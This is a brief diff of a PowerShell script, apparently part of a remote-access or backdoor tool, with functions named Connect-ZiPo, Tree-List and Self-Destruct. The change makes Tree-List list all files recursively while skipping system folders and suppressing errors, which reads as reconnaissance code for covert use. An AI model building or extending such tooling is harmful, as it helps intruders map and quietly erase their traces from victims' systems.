@@ -84,8 +84,16 @@ function Connect-ZiPo {
 }
 
     function Tree-List {
-        return Get-ChildItem -Path $currentDir -Recurse | Select-Object FullName | Out-String
+    try {
+        return Get-ChildItem -Path $currentDir -Recurse -ErrorAction SilentlyContinue |
+               Where-Object { $_.FullName -notmatch '\\Windows\\|\\Program Files' } |
+               Select-Object FullName |
+               Out-String
     }
+    catch {
+        return "[ERROR] $($_.Exception.Message)"
+    }
+}
 
     function Self-Destruct {
         $script = $PSCommandPath
